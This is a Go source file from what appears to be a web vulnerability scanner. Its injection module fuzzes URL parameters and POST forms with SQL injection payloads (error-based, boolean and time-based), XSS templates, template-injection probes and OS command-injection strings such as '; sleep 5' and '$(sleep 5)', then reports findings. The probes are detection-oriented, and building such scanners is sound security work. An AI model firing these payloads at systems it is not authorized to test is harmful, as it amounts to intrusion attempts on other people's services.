package injection

import (
	"bytes"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"

	"golang.org/x/net/html"

	"github.com/MOYARU/PRS-project/internal/checks"
	ctxpkg "github.com/MOYARU/PRS-project/internal/checks/context"
	"github.com/MOYARU/PRS-project/internal/crawler"
	"github.com/MOYARU/PRS-project/internal/engine"
	msges "github.com/MOYARU/PRS-project/internal/messages"
	"github.com/MOYARU/PRS-project/internal/report"
)

var (
	// Pre-lowercased error patterns to avoid repeated ToLower calls
	sqlErrorPatterns = []string{
		"sql syntax", "mysql_fetch", "ora-", "postgresql error", "sqlite/jdbcdriver", "system.data.sqlclient",
		"unclosed quotation mark", "microsoft ole db provider for odbc drivers", "odbc sql server driver",
		"incorrect syntax near", "you have an error in your sql syntax", "mariadb server version",
		"warning: mysql_", "function.pg", "syntax error", "unexpected end of command",
		"sql error", "database error", "fatal error", "query failed", "sqlstate",
	}

	sqlPayloads = []string{
		"'", "\"", "`",
		";", ")", // Syntax breakers
		"' OR '1'='1", "\" OR \"1\"=\"1",
		"' OR 1=1--", "\" OR 1=1--",
		"') OR ('1'='1",
		"' UNION SELECT NULL--",
		"1' ORDER BY 1--+",
		"1' ORDER BY 100--+",
		"' OR '1'='1' #", // MySQL
		"' OR '1'='1'/*", // MySQL/MariaDB
		"admin' --",
		"' /*!50000OR*/ 1=1--", // MySQL version specific
		"::int",                // PostgreSQL type cast error
		"' + (SELECT 1) + '",   // MSSQL concatenation
		"' || '1",              // Oracle concatenation
	}

	xssPayloadTemplates = []string{
		"\"><script>alert('%s')</script>",
		"<script>alert('%s')</script>",
		"<img src=x onerror=alert('%s')>",
		"<svg/onload=alert('%s')>",
		"';alert('%s');//",
		"javascript:alert('%s')",
		"\"><ScRiPt>alert('%s')</sCrIpT>",
		"\"><img src=x onerror=alert('%s')>",
		"\"><svg/onload=alert('%s')>",
		"<body onload=alert('%s')>",
		"<iframe src=\"javascript:alert('%s')\"></iframe>",
		"\"><input autofocus onfocus=alert('%s') x=\"",
		"\" autofocus onfocus=alert('%s') x=\"",
		"'><input autofocus onfocus=alert('%s') x='",
		"\"><details open ontoggle=alert('%s')>",
		"<xss style=\"animation-name:x\" onanimationstart=\"alert('%s')\"></xss><style>@keyframes x{}</style>",
		"<iframe srcdoc=\"<script>alert('%s')</script>\"></iframe>",
		"\"><a href=javascript:alert('%s')>x</a>",
		"<svg><a xlink:href=\"javascript:alert('%s')\">x</a></svg>",
		"%%3Cscript%%3Ealert('%s')%%3C%%2Fscript%%3E",
		"</script><script>alert('%s')</script>",
		"\" onmouseover=\"alert('%s')",
		"' onfocus='alert('%s')",
		"javascript:alert('%s')//",
	}

	booleanPayloads = []struct {
		True  string
		False string
	}{
		{"' OR '1'='1", "' AND '1'='0"},
		{"\" OR \"1\"=\"1", "\" AND \"1\"=\"0"},
		{" OR 1=1", " AND 1=0"},
		{"' OR '1'='1' -- ", "' AND '1'='0' -- "},        // Login Bypass (Generic)
		{"' OR '1'='1' #", "' AND '1'='0' #"},            // Login Bypass (MySQL)
		{"' AND (SELECT 1)=1 #", "' AND (SELECT 1)=0 #"}, // MySQL
		{"' AND 1::int=1--", "' AND 1::int=0--"},         // PostgreSQL
	}
)

type sstiProbe struct {
	Payload  string
	Expected string
}

func getSSTIProbes() []sstiProbe {
	return []sstiProbe{
		{Payload: "{{1337*17}}", Expected: "22729"},
		{Payload: "${1337*17}", Expected: "22729"},
		{Payload: "<%= 1337*17 %>", Expected: "22729"},
		{Payload: "#{1337*17}", Expected: "22729"},
		{Payload: "*{1337*17}", Expected: "22729"},
	}
}

// CheckSQLInjection attempts to detect SQL Injection vulnerabilities by injecting common SQL error triggers.
func CheckSQLInjection(ctx *ctxpkg.Context) ([]report.Finding, error) {
	var findings []report.Finding

	if ctx.Mode != ctxpkg.Active {
		return findings, nil
	}

	u, _ := url.Parse(ctx.InitialURL.String())
	queryParams := u.Query()

	if len(queryParams) == 0 {
		u, _ = url.Parse(ctx.FinalURL.String())
		queryParams = u.Query()
	}
	if len(queryParams) == 0 {
		return findings, nil
	}

ParamLoop:
	for param, values := range queryParams {
		if len(values) == 0 {
			continue
		}
		originalValue := values[0] // Test primarily the first value

		baselineReq, err := http.NewRequest("GET", u.String(), nil)
		if err != nil {
			continue
		}
		baselineResp, err := ctx.HTTPClient.Do(baselineReq)
		if err != nil {
			continue
		}
		baselineBodyBytes, _ := engine.DecodeResponseBody(baselineResp)
		baselineResp.Body.Close()
		baselineBodyLower := strings.ToLower(string(baselineBodyBytes))
		baselineStatus := baselineResp.StatusCode

		// Test cases: Append payload AND Replace with payload
		for _, payload := range sqlPayloads {
			// 1. Append, 2. Replace
			testValues := []string{originalValue + payload, payload}
			for _, testValue := range testValues {

				// Construct malicious URL
				newParams := cloneParams(queryParams)
				newParams.Set(param, testValue)
				u.RawQuery = newParams.Encode()

				req, err := http.NewRequest("GET", u.String(), nil)
				if err != nil {
					continue
				}

				resp, err := doRequest(ctx.HTTPClient, req)
				if err != nil {
					continue
				}

				bodyBytes, _ := engine.DecodeResponseBody(resp)
				resp.Body.Close() // Close immediately to prevent resource leak in loop
				bodyString := string(bodyBytes)
				bodyStringLower := strings.ToLower(bodyString)

				// Ignore 501 Not Implemented and 405 Method Not Allowed
				if resp.StatusCode == http.StatusNotImplemented || resp.StatusCode == http.StatusMethodNotAllowed {
					continue
				}

				// Check for 500 Internal Server Error as a hint
				if resp.StatusCode == http.StatusInternalServerError && baselineStatus != http.StatusInternalServerError {
					msg := msges.GetMessage("SQL_INJECTION_ERROR_BASED")
					findings = append(findings, report.Finding{
						ID:         "SQL_INJECTION_ERROR_BASED",
						Category:   string(checks.CategoryInputHandling),
						Severity:   report.SeverityMedium, // Lower severity for status code only
						Confidence: report.ConfidenceLow,
						Title:      msg.Title + " (Status 500)",
						Message:    fmt.Sprintf("HTTP 500 Error triggered by payload: %s in param: %s", payload, param),
						Evidence:   fmt.Sprintf("Status Code: %d", resp.StatusCode),
						Fix:        msg.Fix,
					})
				}

				for _, pattern := range sqlErrorPatterns {
					if strings.Contains(bodyStringLower, pattern) && !strings.Contains(baselineBodyLower, pattern) {
						msg := msges.GetMessage("SQL_INJECTION_ERROR_BASED")
						findings = append(findings, report.Finding{
							ID:         "SQL_INJECTION_ERROR_BASED",
							Category:   string(checks.CategoryInputHandling),
							Severity:   report.SeverityHigh,
							Confidence: report.ConfidenceHigh,
							Title:      msg.Title,
							Message:    fmt.Sprintf(msg.Message, param, payload),
							Evidence:   fmt.Sprintf("Found error pattern: '%s'", pattern),
							Fix:        msg.Fix,
						})
						continue ParamLoop
					}
				}
			}
		}

		// Boolean-Based Blind SQL Injection Check (New)
		// 에러가 발생하지 않는 간단한 사이트(Blind)를 위해 참/거짓 쿼리의 응답 차이를 비교합니다.
		for _, bp := range booleanPayloads {
			newParamsTrue := cloneParams(queryParams)
			newParamsTrue.Set(param, originalValue+bp.True)
			u.RawQuery = newParamsTrue.Encode()
			reqTrue, err := http.NewRequest("GET", u.String(), nil)
			if err != nil {
				continue
			}
			respTrue, err := doRequest(ctx.HTTPClient, reqTrue)
			if err != nil {
				continue
			}
			bodyTrue, _ := engine.DecodeResponseBody(respTrue)
			respTrue.Body.Close()

			newParamsFalse := cloneParams(queryParams)
			newParamsFalse.Set(param, originalValue+bp.False)
			u.RawQuery = newParamsFalse.Encode()
			reqFalse, err := http.NewRequest("GET", u.String(), nil)
			if err != nil {
				continue
			}
			respFalse, err := doRequest(ctx.HTTPClient, reqFalse)
			if err != nil {
				continue
			}
			bodyFalse, _ := engine.DecodeResponseBody(respFalse)
			respFalse.Body.Close()

			if respTrue.StatusCode == http.StatusOK && respFalse.StatusCode == http.StatusOK {
				diff := len(bodyTrue) - len(bodyFalse)
				if diff < 0 {
					diff = -diff
				}
				// 응답 길이 차이가 50바이트 이상이고 10% 이상 차이나면 취약점으로 간주
				if diff > 50 && float64(diff) > float64(len(bodyTrue))*0.1 {
					msg := msges.GetMessage("BLIND_SQLI_TIME_BASED") // 조치 방안은 동일하므로 메시지 재사용
					findings = append(findings, report.Finding{
						ID:         "SQL_INJECTION_BOOLEAN",
						Category:   string(checks.CategoryInputHandling),
						Severity:   report.SeverityHigh,
						Confidence: report.ConfidenceMedium,
						Title:      "Boolean-based SQL Injection Detected",
						Message:    fmt.Sprintf("Response difference detected between TRUE/FALSE payloads on param: %s.\nTrue Payload: %s\nFalse Payload: %s", param, bp.True, bp.False),
						Evidence:   fmt.Sprintf("Response length difference: %d bytes (True: %d, False: %d)", diff, len(bodyTrue), len(bodyFalse)),
						Fix:        msg.Fix,
					})
					continue ParamLoop
				}
			}
		}
	}

	// Check POST Forms
	findings = append(findings, checkPostSQLInjection(ctx)...)
	findings = append(findings, checkPostBooleanSQLInjection(ctx)...)

	return findings, nil
}

func CheckReflectedXSS(ctx *ctxpkg.Context) ([]report.Finding, error) {
	var findings []report.Finding

	if ctx.Mode != ctxpkg.Active {
		return findings, nil
	}

	canary := "PRS_XSS_PROBE"
	u, _ := url.Parse(ctx.InitialURL.String())
	queryParams := u.Query()

	if len(queryParams) == 0 {
		u, _ = url.Parse(ctx.FinalURL.String())
		queryParams = u.Query()
	}
	if len(queryParams) == 0 {
		return findings, nil
	}

	for param, values := range queryParams {
		if len(values) == 0 {
			continue
		}
		originalValue := values[0]

		for _, tmpl := range xssPayloadTemplates {
			payload := fmt.Sprintf(tmpl, canary)

			// 기존 값 뒤에 추가(Append)하는 경우와 값을 완전히 교체(Replace)하는 경우 모두 테스트
			testValues := []string{originalValue + payload, payload}
			found := false

			for _, val := range testValues {
				newParams := cloneParams(queryParams)
				newParams.Set(param, val)
				u.RawQuery = newParams.Encode()

				req, err := http.NewRequest("GET", u.String(), nil)
				if err != nil {
					continue
				}

				resp, err := doRequest(ctx.HTTPClient, req)
				if err != nil {
					continue
				}

				bodyBytes, _ := engine.DecodeResponseBody(resp)
				resp.Body.Close() // Close immediately to prevent resource leak in loop
				bodyString := string(bodyBytes)

				if strings.Contains(bodyString, payload) && strings.Contains(resp.Header.Get("Content-Type"), "text/html") {
					msg := msges.GetMessage("REFLECTED_XSS")
					findings = append(findings, report.Finding{
						ID:         "REFLECTED_XSS",
						Category:   string(checks.CategoryClientSecurity),
						Severity:   report.SeverityHigh,
						Confidence: report.ConfidenceMedium,
						Title:      msg.Title,
						Message:    fmt.Sprintf(msg.Message, param),
						Evidence:   payload,
						Fix:        msg.Fix,
					})
					found = true
					break
				}
			}
			if found {
				break // 해당 파라미터에서 취약점 발견 시 다음 파라미터로 이동
			}
		}
	}

	// Check POST Forms for XSS
	findings = append(findings, checkPostReflectedXSS(ctx)...)

	return findings, nil
}

func CheckBlindSQLInjection(ctx *ctxpkg.Context) ([]report.Finding, error) {
	delaySeconds := 5
	payloads := []string{
		fmt.Sprintf("' AND (SELECT %d FROM (SELECT(SLEEP(%d)))a)-- ", delaySeconds, delaySeconds), // MySQL
		fmt.Sprintf("'; SELECT pg_sleep(%d)--", delaySeconds),                                     // PostgreSQL
		fmt.Sprintf("' WAITFOR DELAY '0:0:%d'--", delaySeconds),                                   // MSSQL
		fmt.Sprintf("' OR (SELECT * FROM (SELECT(SLEEP(%d)))a)--", delaySeconds),                  // MySQL Alternative
		fmt.Sprintf("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a', %d)--", delaySeconds),                 // Oracle
	}
	return checkTimeBasedInjection(ctx, delaySeconds, payloads, "BLIND_SQLI_TIME_BASED", "BLIND_SQLI_TIME_BASED")
}

// CheckOSCommandInjection attempts to detect time-based OS command injection.
func CheckOSCommandInjection(ctx *ctxpkg.Context) ([]report.Finding, error) {
	delaySeconds := 5
	payloads := []string{
		fmt.Sprintf("&& sleep %d", delaySeconds),               // Unix
		fmt.Sprintf("; sleep %d", delaySeconds),                // Unix
		fmt.Sprintf("| sleep %d", delaySeconds),                // Unix
		fmt.Sprintf("&& ping -n %d 127.0.0.1", delaySeconds+1), // Windows
		fmt.Sprintf("| ping -n %d 127.0.0.1", delaySeconds+1),  // Windows
		fmt.Sprintf("`sleep %d`", delaySeconds),                // Backticks execution
		fmt.Sprintf("$(sleep %d)", delaySeconds),               // Command substitution
	}
	return checkTimeBasedInjection(ctx, delaySeconds, payloads, "OS_COMMAND_INJECTION_TIME_BASED", "OS_COMMAND_INJECTION_TIME_BASED")
}

// checkTimeBasedInjection is a generic function for time-based vulnerability checks (e.g., Blind SQLi, OS Command Injection).
func checkTimeBasedInjection(ctx *ctxpkg.Context, delaySeconds int, payloads []string, msgKey string, findingID string) ([]report.Finding, error) {
	var findings []report.Finding
	if ctx.Mode != ctxpkg.Active {
		return findings, nil
	}

	u, _ := url.Parse(ctx.InitialURL.String())
	queryParams := u.Query()

	if len(queryParams) == 0 {
		u, _ = url.Parse(ctx.FinalURL.String())
		queryParams = u.Query()
	}

	if len(queryParams) > 0 {
	ParamLoop:
		for param, values := range queryParams {
			if len(values) == 0 {
				continue
			}
			originalValue := values[0]

			for _, payload := range payloads {
				newParams := cloneParams(queryParams)
				newParams.Set(param, originalValue+payload)
				u.RawQuery = newParams.Encode()

				req, err := http.NewRequest("GET", u.String(), nil)
				if err != nil {
					continue
				}

				startTime := time.Now()
				resp, err := doRequest(ctx.HTTPClient, req)
				duration := time.Since(startTime)

				if err != nil {
					continue
				}
				resp.Body.Close()

				if duration.Seconds() >= float64(delaySeconds) {
					// Verification: Retest to confirm it's not a network jitter
					reqVerify, errVerify := http.NewRequest("GET", u.String(), nil)
					if errVerify == nil {
						startVerify := time.Now()
						respVerify, errVerify := doRequest(ctx.HTTPClient, reqVerify)
						if errVerify == nil {
							respVerify.Body.Close()
							if time.Since(startVerify).Seconds() < float64(delaySeconds) {
								continue
							}
						}
					}

					msg := msges.GetMessage(msgKey)
					findings = append(findings, report.Finding{
						ID:                         findingID,
						Category:                   string(checks.CategoryInputHandling),
						Severity:                   report.SeverityHigh,
						Confidence:                 report.ConfidenceMedium,
						Title:                      msg.Title,
						Message:                    fmt.Sprintf(msg.Message, param, delaySeconds),
						Evidence:                   fmt.Sprintf("Response time: %.2f seconds", duration.Seconds()),
						Fix:                        msg.Fix,
						IsPotentiallyFalsePositive: msg.IsPotentiallyFalsePositive,
					})
					continue ParamLoop
				}
			}
		}
	}

	// Check POST Forms
	findings = append(findings, checkPostTimeBasedInjection(ctx, delaySeconds, payloads, msgKey, findingID)...)

	return findings, nil
}

// CheckSSTI attempts to detect Server-Side Template Injection.
func CheckSSTI(ctx *ctxpkg.Context) ([]report.Finding, error) {
	var findings []report.Finding
	if ctx.Mode != ctxpkg.Active {
		return findings, nil
	}

	u, _ := url.Parse(ctx.InitialURL.String())
	queryParams := u.Query()
	if len(queryParams) == 0 {
		u, _ = url.Parse(ctx.FinalURL.String())
		queryParams = u.Query()
	}
	if len(queryParams) == 0 {
		return findings, nil
	}

	baselineBody := string(ctx.BodyBytes)
	for param, values := range queryParams {
		if len(values) == 0 {
			continue
		}
		originalValue := values[0]
		for _, probe := range getSSTIProbes() {
			newParams := cloneParams(queryParams)
			newParams.Set(param, originalValue+probe.Payload) // Append
			u.RawQuery = newParams.Encode()

			req, err := http.NewRequest("GET", u.String(), nil)
			if err != nil {
				continue
			}
			resp, err := doRequest(ctx.HTTPClient, req)
			if err != nil {
				continue
			}

			bodyBytes, _ := engine.DecodeResponseBody(resp)
			resp.Body.Close() // Close immediately to prevent resource leak in loop
			bodyString := string(bodyBytes)

			if strings.Contains(bodyString, probe.Expected) &&
				!strings.Contains(bodyString, "1337*17") &&
				!strings.Contains(baselineBody, probe.Expected) {
				msg := msges.GetMessage("SSTI_DETECTED")
				findings = append(findings, report.Finding{
					ID:         "SSTI_DETECTED",
					Category:   string(checks.CategoryInputHandling),
					Severity:   report.SeverityHigh,
					Confidence: report.ConfidenceHigh,
					Title:      msg.Title,
					Message:    fmt.Sprintf(msg.Message, param),
					Evidence:   fmt.Sprintf("The expression payload was evaluated to '%s' by the server.", probe.Expected),
					Fix:        msg.Fix,
				})
				break
			}
		}
	}

	// Check POST Forms for SSTI
	findings = append(findings, checkPostSSTI(ctx)...)

	return findings, nil
}

// TODO: Stored XSS, DOM XSS, NoSQL, LDAP injection checks require more advanced techniques. 의 흔적 3

func cloneParams(v url.Values) url.Values {
	dst := make(url.Values, len(v))
	for k, vv := range v {
		dst[k] = append([]string(nil), vv...)
	}
	return dst
}

func checkPostSQLInjection(ctx *ctxpkg.Context) []report.Finding {
	var findings []report.Finding
	forms := extractForms(ctx)
	for _, form := range forms {
		// Strategy: Try both Append and Replace
		findings = append(findings, fuzzForm(ctx, form, sqlPayloads,
			func(orig, payload string) []string { return []string{orig + payload, payload} },
			func(resp *http.Response, bodyString, payload string, targetInput crawler.FormInput) []report.Finding {
				var fs []report.Finding
				bodyStringLower := strings.ToLower(bodyString)

				// Check for 500 Internal Server Error
				if resp.StatusCode == http.StatusInternalServerError {
					msg := msges.GetMessage("SQL_INJECTION_ERROR_BASED")
					fs = append(fs, report.Finding{
						ID:         "SQL_INJECTION_ERROR_BASED",
						Category:   string(checks.CategoryInputHandling),
						Severity:   report.SeverityMedium,
						Confidence: report.ConfidenceLow,
						Title:      msg.Title + " (Status 500)",
						Message:    fmt.Sprintf("HTTP 500 Error triggered by payload: %s in field: %s", payload, targetInput.Name),
						Evidence:   fmt.Sprintf("Status Code: %d", resp.StatusCode),
						Fix:        msg.Fix,
					})
				}

				for _, pattern := range sqlErrorPatterns {
					if strings.Contains(bodyStringLower, pattern) {
						msg := msges.GetMessage("SQL_INJECTION_ERROR_BASED")
						fs = append(fs, report.Finding{
							ID:         "SQL_INJECTION_ERROR_BASED",
							Category:   string(checks.CategoryInputHandling),
							Severity:   report.SeverityHigh,
							Confidence: report.ConfidenceHigh,
							Title:      msg.Title,
							Message:    fmt.Sprintf(msg.Message, targetInput.Name+" (POST)", payload),
							Evidence:   fmt.Sprintf("Found error pattern: '%s'", pattern),
							Fix:        msg.Fix,
						})
						return fs // Found definitive error, return immediately
					}
				}
				return fs
			})...)
	}
	return findings
}

func checkPostReflectedXSS(ctx *ctxpkg.Context) []report.Finding {
	var findings []report.Finding
	forms := extractForms(ctx)
	canary := "PRS_XSS_POST"
	var payloads []string
	for _, tmpl := range xssPayloadTemplates {
		payloads = append(payloads, fmt.Sprintf(tmpl, canary))
	}

	for _, form := range forms {
		// Strategy: Replace only
		findings = append(findings, fuzzForm(ctx, form, payloads,
			func(orig, payload string) []string { return []string{payload} },
			func(resp *http.Response, bodyString, payload string, targetInput crawler.FormInput) []report.Finding {
				if strings.Contains(bodyString, payload) && strings.Contains(resp.Header.Get("Content-Type"), "text/html") {
					msg := msges.GetMessage("REFLECTED_XSS")
					return []report.Finding{{
						ID:         "REFLECTED_XSS",
						Category:   string(checks.CategoryClientSecurity),
						Severity:   report.SeverityHigh,
						Confidence: report.ConfidenceMedium,
						Title:      msg.Title + " (POST)",
						Message:    fmt.Sprintf(msg.Message, targetInput.Name+" (POST)"),
						Evidence:   payload,
						Fix:        msg.Fix,
					}}
				}
				return nil
			})...)
	}
	return findings
}

func checkPostSSTI(ctx *ctxpkg.Context) []report.Finding {
	var findings []report.Finding
	forms := extractForms(ctx)
	probes := getSSTIProbes()
	var payloads []string
	for _, p := range probes {
		payloads = append(payloads, p.Payload)
	}
	for _, form := range forms {
		// Strategy: Append only
		findings = append(findings, fuzzForm(ctx, form, payloads,
			func(orig, payload string) []string { return []string{orig + payload} },
			func(resp *http.Response, bodyString, payload string, targetInput crawler.FormInput) []report.Finding {
				expected := ""
				for _, p := range probes {
					if p.Payload == payload {
						expected = p.Expected
						break
					}
				}
				if expected == "" {
					return nil
				}
				if strings.Contains(bodyString, expected) && !strings.Contains(bodyString, "1337*17") && !strings.Contains(string(ctx.BodyBytes), expected) {
					msg := msges.GetMessage("SSTI_DETECTED")
					return []report.Finding{{
						ID:         "SSTI_DETECTED",
						Category:   string(checks.CategoryInputHandling),
						Severity:   report.SeverityHigh,
						Confidence: report.ConfidenceHigh,
						Title:      msg.Title + " (POST)",
						Message:    fmt.Sprintf(msg.Message, targetInput.Name+" (POST)"),
						Evidence:   fmt.Sprintf("The expression payload was evaluated to '%s' by the server.", expected),
						Fix:        msg.Fix,
					}}
				}
				return nil
			})...)
	}
	return findings
}

func checkPostBooleanSQLInjection(ctx *ctxpkg.Context) []report.Finding {
	var findings []report.Finding
	forms := extractForms(ctx)
	for _, form := range forms {
		if form.Method != "POST" {
			continue
		}

		var targetURL string
		if form.ActionURL == "" {
			targetURL = ctx.FinalURL.String()
		} else {
			u, err := url.Parse(form.ActionURL)
			if err == nil {
				targetURL = ctx.FinalURL.ResolveReference(u).String()
			} else {
				continue
			}
		}

		inputs := form.Inputs

		for i, targetInput := range inputs {
			if isProtectedField(targetInput) {
				continue
			}

			for _, bp := range booleanPayloads {
				// Helper to send request
				sendReq := func(payload string) (*http.Response, []byte, error) {
					formValues := url.Values{}
					for j, input := range inputs {
						if i == j {
							formValues.Set(input.Name, input.Value+payload)
						} else {
							formValues.Set(input.Name, input.Value)
						}
					}
					req, err := http.NewRequest("POST", targetURL, strings.NewReader(formValues.Encode()))
					if err != nil {
						return nil, nil, err
					}
					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
					resp, err := doRequest(ctx.HTTPClient, req)
					if err != nil {
						return nil, nil, err
					}
					bodyBytes, _ := engine.DecodeResponseBody(resp)
					resp.Body.Close()
					return resp, bodyBytes, nil
				}

				respTrue, bodyTrue, errTrue := sendReq(bp.True)
				if errTrue != nil {
					continue
				}

				respFalse, bodyFalse, errFalse := sendReq(bp.False)
				if errFalse != nil {
					continue
				}

				// 1. Check Status Code Difference (e.g. Login Success 302 vs Fail 200)
				if respTrue.StatusCode != respFalse.StatusCode {
					msg := msges.GetMessage("BLIND_SQLI_TIME_BASED")
					findings = append(findings, report.Finding{
						ID:         "SQL_INJECTION_BOOLEAN",
						Category:   string(checks.CategoryInputHandling),
						Severity:   report.SeverityHigh,
						Confidence: report.ConfidenceHigh,
						Title:      "Boolean-based SQL Injection Detected (POST - Status Code)",
						Message:    fmt.Sprintf("Status code difference detected between TRUE/FALSE payloads on POST param: %s.\nTrue Payload: %s (Status: %d)\nFalse Payload: %s (Status: %d)", targetInput.Name, bp.True, respTrue.StatusCode, bp.False, respFalse.StatusCode),
						Evidence:   fmt.Sprintf("Status Code: %d vs %d", respTrue.StatusCode, respFalse.StatusCode),
						Fix:        msg.Fix,
					})
					goto NextInput
				}

				// 2. Check Content Length Difference
				if respTrue.StatusCode == respFalse.StatusCode {
					diff := len(bodyTrue) - len(bodyFalse)
					if diff < 0 {
						diff = -diff
					}
					if diff > 50 && float64(diff) > float64(len(bodyTrue))*0.1 {
						msg := msges.GetMessage("BLIND_SQLI_TIME_BASED")
						findings = append(findings, report.Finding{
							ID:         "SQL_INJECTION_BOOLEAN",
							Category:   string(checks.CategoryInputHandling),
							Severity:   report.SeverityHigh,
							Confidence: report.ConfidenceMedium,
							Title:      "Boolean-based SQL Injection Detected (POST)",
							Message:    fmt.Sprintf("Response difference detected between TRUE/FALSE payloads on POST param: %s.\nTrue Payload: %s\nFalse Payload: %s", targetInput.Name, bp.True, bp.False),
							Evidence:   fmt.Sprintf("Response length difference: %d bytes", diff),
							Fix:        msg.Fix,
						})
						goto NextInput
					}
				}
			}
		NextInput:
		}
	}
	return findings
}

func isProtectedField(input crawler.FormInput) bool {
	name := strings.ToLower(input.Name)
	if strings.Contains(name, "csrf") || strings.Contains(name, "xsrf") ||
		strings.EqualFold(name, "__requestverificationtoken") || strings.EqualFold(name, "authenticity_token") ||
		strings.EqualFold(name, "_token") {
		return true
	}
	return false
}

// fuzzForm is a generic helper to fuzz form inputs with given payloads and analysis logic.
func fuzzForm(ctx *ctxpkg.Context, form crawler.Form, payloads []string,
	valueGen func(string, string) []string,
	analyze func(*http.Response, string, string, crawler.FormInput) []report.Finding) []report.Finding {

	var findings []report.Finding

	if form.Method != "POST" {
		return findings
	}

	var targetURL string
	if form.ActionURL == "" {
		targetURL = ctx.FinalURL.String()
	} else {
		u, err := url.Parse(form.ActionURL)
		if err == nil {
			targetURL = ctx.FinalURL.ResolveReference(u).String()
		} else {
			return findings
		}
	}

	inputs := form.Inputs

	for i, targetInput := range inputs {
		if isProtectedField(targetInput) {
			continue
		}

		for _, payload := range payloads {
			testValues := valueGen(targetInput.Value, payload)
			for _, testValue := range testValues {
				formValues := url.Values{}
				for j, input := range inputs {
					if i == j {
						formValues.Set(input.Name, testValue)
					} else {
						formValues.Set(input.Name, input.Value)
					}
				}

				req, err := http.NewRequest("POST", targetURL, strings.NewReader(formValues.Encode()))
				if err != nil {
					continue
				}
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

				resp, err := doRequest(ctx.HTTPClient, req)
				if err != nil {
					continue
				}

				resp, err = handlePostRedirect(ctx, resp)
				if err != nil {
					continue
				}

				// Ignore 501 and 405
				if resp.StatusCode == http.StatusNotImplemented || resp.StatusCode == http.StatusMethodNotAllowed {
					resp.Body.Close()
					continue
				}

				bodyBytes, _ := engine.DecodeResponseBody(resp)
				resp.Body.Close()
				bodyString := string(bodyBytes)

				newFindings := analyze(resp, bodyString, payload, targetInput)
				if len(newFindings) > 0 {
					findings = append(findings, newFindings...)
					// Found a vulnerability for this input, stop fuzzing this input to avoid spam
					goto NextInput
				}
			}
		}
	NextInput:
	}
	return findings
}

func checkPostTimeBasedInjection(ctx *ctxpkg.Context, delaySeconds int, payloads []string, msgKey string, findingID string) []report.Finding {
	var findings []report.Finding
	forms := extractForms(ctx)
	for _, form := range forms {
		findings = append(findings, testFormTimeBasedInjection(ctx, form, delaySeconds, payloads, msgKey, findingID)...)
	}
	return findings
}

func testFormTimeBasedInjection(ctx *ctxpkg.Context, form crawler.Form, delaySeconds int, payloads []string, msgKey string, findingID string) []report.Finding {
	var findings []report.Finding

	if form.Method != "POST" {
		return findings
	}

	var targetURL string
	if form.ActionURL == "" {
		targetURL = ctx.FinalURL.String()
	} else {
		u, err := url.Parse(form.ActionURL)
		if err == nil {
			targetURL = ctx.FinalURL.ResolveReference(u).String()
		} else {
			return findings
		}
	}

	inputs := form.Inputs

	for i, targetInput := range inputs {
		if isProtectedField(targetInput) {
			continue
		}

		for _, payload := range payloads {
			formValues := url.Values{}
			for j, input := range inputs {
				if i == j {
					formValues.Set(input.Name, input.Value+payload)
				} else {
					formValues.Set(input.Name, input.Value)
				}
			}

			req, err := http.NewRequest("POST", targetURL, strings.NewReader(formValues.Encode()))
			if err != nil {
				continue
			}
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

			startTime := time.Now()
			resp, err := doRequest(ctx.HTTPClient, req)
			if err != nil {
				continue
			}

			duration := time.Since(startTime)
			resp.Body.Close()

			if duration.Seconds() >= float64(delaySeconds) {
				// Verification: Retest to confirm
				reqVerify, errVerify := http.NewRequest("POST", targetURL, strings.NewReader(formValues.Encode()))
				if errVerify == nil {
					reqVerify.Header.Set("Content-Type", "application/x-www-form-urlencoded")
					startVerify := time.Now()
					respVerify, errVerify := doRequest(ctx.HTTPClient, reqVerify)
					if errVerify == nil {
						respVerify.Body.Close()
						if time.Since(startVerify).Seconds() < float64(delaySeconds) {
							continue
						}
					}
				}

				msg := msges.GetMessage(msgKey)
				findings = append(findings, report.Finding{
					ID:                         findingID,
					Category:                   string(checks.CategoryInputHandling),
					Severity:                   report.SeverityHigh,
					Confidence:                 report.ConfidenceMedium,
					Title:                      msg.Title + " (POST)",
					Message:                    fmt.Sprintf(msg.Message, targetInput.Name+" (POST)", delaySeconds),
					Evidence:                   fmt.Sprintf("Response time: %.2f seconds", duration.Seconds()),
					Fix:                        msg.Fix,
					IsPotentiallyFalsePositive: msg.IsPotentiallyFalsePositive,
				})
				break
			}
		}
	}
	return findings
}

// extractForms parses the response body and extracts forms if the content type is HTML.
func extractForms(ctx *ctxpkg.Context) []crawler.Form {
	if !strings.Contains(ctx.Response.Header.Get("Content-Type"), "text/html") {
		return nil
	}
	doc, err := html.Parse(bytes.NewReader(ctx.BodyBytes))
	if err != nil {
		return nil
	}
	return crawler.ExtractForms(doc)
}

// handlePostRedirect handles 3xx redirects for POST requests by following them with a GET request.
func handlePostRedirect(ctx *ctxpkg.Context, resp *http.Response) (*http.Response, error) {
	if resp.StatusCode >= 300 && resp.StatusCode < 400 {
		loc, err := resp.Location()
		if err != nil {
			resp.Body.Close()
			return nil, err
		}
		resp.Body.Close()

		req2, err := http.NewRequest("GET", loc.String(), nil)
		if err != nil {
			return nil, err
		}
		return doRequest(ctx.HTTPClient, req2)
	}
	return resp, nil
}

func doRequest(client *http.Client, req *http.Request) (*http.Response, error) {
	resp, err := client.Do(req)
	if err != nil {
		if resp != nil && resp.Body != nil {
			resp.Body.Close()
		}
		return nil, err
	}
	return resp, nil
}
